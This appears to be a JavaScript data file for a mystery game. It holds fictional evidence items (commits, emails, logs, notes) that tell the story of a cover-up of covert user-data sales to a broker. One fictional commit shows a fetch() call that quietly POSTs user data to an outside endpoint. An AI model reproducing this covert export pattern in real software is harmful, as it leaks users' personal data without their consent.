// All evidence items in the game.
// 'unlockAfter' means this evidence only appears after the listed evidence IDs are collected.
export const EVIDENCE_ITEMS = [
  // --- GIT COMMITS ---
  {
    id: 'git_001',
    type: 'git',
    title: 'Suspicious Git Commit',
    folder: 'git_log',
    icon: '📝',
    unlockAfter: [],
    content: `commit a3f91cc
Author: Sam Carter <sam.carter@nexus.corp>
Date:   Mon Oct 14 02:14:07 2024

    chore: scheduled maintenance - remove deprecated monitoring scripts

 src/monitoring/data_watch.py | 312 -----------
 1 file changed, 312 deletions(-)`,
    analysis: 'Sam Carter deleted a monitoring script at 2:14 AM — the same night Alex disappeared. This was not on the maintenance calendar.',
  },
  {
    id: 'git_002',
    type: 'git',
    title: "Alex's Last Commit",
    folder: 'git_log',
    icon: '📝',
    unlockAfter: [],
    content: `commit 7b2e449
Author: Alex Mercer <alex.mercer@nexus.corp>
Date:   Sun Oct 13 23:58:14 2024

    WIP: investigating anomalous outbound traffic - DO NOT MERGE

 src/audit/traffic_monitor.py | 89 +++++++++
 notes/findings.enc           | 1 +
 1 file changed, 90 insertions(+)`,
    analysis: "Alex's last commit was at 11:58 PM investigating outbound traffic. They also created an encrypted file: notes/findings.enc",
  },
  {
    id: 'git_003',
    type: 'git',
    title: 'The Telemetry Update Ticket',
    folder: 'git_log',
    icon: '📝',
    unlockAfter: ['git_001'],
    content: `commit d9a1b83
Author: Jordan Lee <jordan.lee@nexus.corp>
Date:   Fri Oct 11 14:22:31 2024

    feat: Q3 telemetry enhancement (approved by PM - ticket #NX-2291)

 src/services/telemetry.js | 47 +++++++++++++
 1 file changed, 47 insertions(+)

--- src/services/telemetry.js (excerpt) ---
// Route aggregated user data to analytics endpoint
const EXPORT_ENDPOINT = 'https://api.databridge-solutions.io/ingest';
fetch(EXPORT_ENDPOINT, { method: 'POST', body: JSON.stringify(userData) });`,
    analysis: 'The "telemetry update" is actually sending user data to an external company called DataBridge Solutions. PM Priya Nair approved this ticket.',
  },

  // --- EMAILS ---
  {
    id: 'email_001',
    type: 'email',
    title: "Alex's Draft Email (Unsent)",
    folder: 'emails',
    icon: '📧',
    unlockAfter: ['git_002'],
    content: `FROM: alex.mercer@nexus.corp
TO: security@nexus.corp
SUBJECT: URGENT - Unauthorized Data Export to Third Party
STATUS: DRAFT — NEVER SENT

I have discovered that production builds since September include code that silently 
exports user PII to api.databridge-solutions.io.

Attached: traffic_monitor.py analysis, server logs (Oct 10-13).

I raised this with Jordan Lee yesterday. They went pale and said "don't file this report, 
talk to me first." I then raised it with Priya Nair who said it was "approved telemetry."

This is NOT approved telemetry. This is a data breach.

I am filing this with external regulators if I don't hear back by—`,
    analysis: "Alex was about to report a data breach to security. The email was never sent. They tried to raise it internally first — both Jordan and Priya shut it down.",
  },
  {
    id: 'email_002',
    type: 'email',
    title: 'Dana Voss Internal Email',
    folder: 'emails',
    icon: '📧',
    unlockAfter: ['email_001', 'git_003'],
    content: `FROM: dana.voss@nexus.corp
TO: sam.carter@nexus.corp
DATE: Mon Oct 14 01:47:22 2024
SUBJECT: Production cleanup — tonight

Sam,

Per our earlier conversation: proceed with the scheduled "maintenance" on prod tonight.
Remove the scripts we discussed. Revoke the access we discussed.

This is authorized at the executive level. No ticket needed.

Keep this between us.

— D`,
    analysis: "Dana Voss ordered Sam Carter to delete Alex's monitoring scripts and revoke their access — at 1:47 AM, hours before Sam's 2:14 AM commit. This is a cover-up order.",
  },
  {
    id: 'email_003',
    type: 'email',
    title: 'HR Performance Review (Suspicious)',
    folder: 'emails',
    icon: '📧',
    unlockAfter: ['email_002'],
    content: `FROM: hr@nexus.corp
TO: alex.mercer@nexus.corp
DATE: Mon Oct 14 09:02:11 2024
SUBJECT: Performance Improvement Plan — Immediate Effect

Dear Alex,

Following a review by executive leadership, we are placing you on an immediate 
Performance Improvement Plan due to concerns around:
- Insubordination
- Unauthorized access to production monitoring systems
- Breach of confidentiality

Effective today, your production access has been revoked.
Please surrender your access badge to reception.

— Human Resources, Nexus Corp`,
    analysis: 'This HR email was sent at 9AM — AFTER Alex\'s access was already revoked at 2AM by Sam. The "performance review" is fabricated to justify what was already done. Created after the fact.',
  },

  // --- NOTES / FILES ---
  {
    id: 'note_001',
    type: 'note',
    title: "Alex's Sticky Note",
    folder: 'desktop',
    icon: '🗒️',
    unlockAfter: [],
    content: `[sticky note found on monitor]

databridge??? who approved this?
jordan knows something
priya signed off on NX-2291 without reading it??

enc key = my dog's name + year i graduated
findings.enc — DO NOT DELETE`,
    analysis: "Alex suspected someone approved the data export without reviewing it. They encrypted their findings and left a hint about the decryption key.",
  },
  {
    id: 'note_002',
    type: 'file',
    title: 'Encrypted File: findings.enc',
    folder: 'desktop',
    icon: '🔐',
    unlockAfter: ['note_001'],
    content: `[DECRYPTED CONTENTS — Key: "rocky2019"]

DataBridge Solutions is a data broker.
They pay Nexus Corp $0.12 per user record per month.
Estimated monthly export: ~850,000 records.
Monthly revenue to Nexus: ~$102,000.

This is a violation of our privacy policy and GDPR Article 6.
Users have NOT consented to third-party data sharing.

I found this by analyzing outbound traffic spikes every Sunday at 3AM.
The code was introduced in commit d9a1b83 by Jordan Lee.

I spoke to Jordan — he said management is aware and I should "let it go."
I spoke to Priya — she said it was "approved."
I need to escalate externally.

— Alex, Oct 13 2024`,
    analysis: "CRITICAL EVIDENCE: Alex fully documented the data breach. DataBridge Solutions pays Nexus $102K/month for user data. This is the motive — Alex had to be silenced.",
  },
  {
    id: 'log_001',
    type: 'log',
    title: 'Server Access Log — Oct 14',
    folder: 'logs',
    icon: '📋',
    unlockAfter: ['git_001'],
    content: `[PRODUCTION SERVER ACCESS LOG]
[2024-10-14 02:14:07] USER: sam.carter — SUDO rm -rf /opt/nexus/monitoring/data_watch.py
[2024-10-14 02:15:43] USER: sam.carter — EXEC: revoke_access.sh --user=alex.mercer
[2024-10-14 02:16:01] USER: sam.carter — LOGOUT

[2024-10-14 09:00:00] SYSTEM: Access credentials for alex.mercer marked INACTIVE
[2024-10-14 09:02:11] USER: hr.system — EMAIL SENT to alex.mercer re: PIP`,
    analysis: "Server logs confirm Sam Carter deleted Alex's script and revoked their access at 2AM — a full 7 hours before the HR email was sent. The PIP was created to retroactively justify the lockout.",
  },
  {
    id: 'log_002',
    type: 'log',
    title: 'Network Traffic Log — Oct 10-13',
    folder: 'logs',
    icon: '📋',
    unlockAfter: ['note_002'],
    content: `[OUTBOUND NETWORK TRAFFIC — SUNDAYS 03:00-03:15]

2024-10-06 03:02:14  POST api.databridge-solutions.io/ingest  STATUS:200  SIZE: 847MB
2024-10-13 03:01:58  POST api.databridge-solutions.io/ingest  STATUS:200  SIZE: 863MB

[ENDPOINT LOOKUP]
api.databridge-solutions.io → WHOIS: DataBridge Solutions LLC, Delaware, USA
  Registered: 2022-03-14
  Contact: [REDACTED]
  
[NOTE] This endpoint is not listed in our approved vendor registry.`,
    analysis: 'Confirms weekly data exports to DataBridge Solutions. 850MB+ per week of user data. This endpoint was never in the approved vendor list — it was smuggled in via the telemetry commit.',
  },
]

export function getEvidenceById(id) {
  return EVIDENCE_ITEMS.find((e) => e.id === id)
}

export function getAvailableEvidence(collectedIds) {
  return EVIDENCE_ITEMS.filter((item) => {
    // Item is available if all its unlock prerequisites are collected
    return item.unlockAfter.every((prereq) => collectedIds.includes(prereq))
  })
}

export function getFolders() {
  const folders = {}
  EVIDENCE_ITEMS.forEach((item) => {
    if (!folders[item.folder]) folders[item.folder] = []
    folders[item.folder].push(item)
  })
  return folders
}
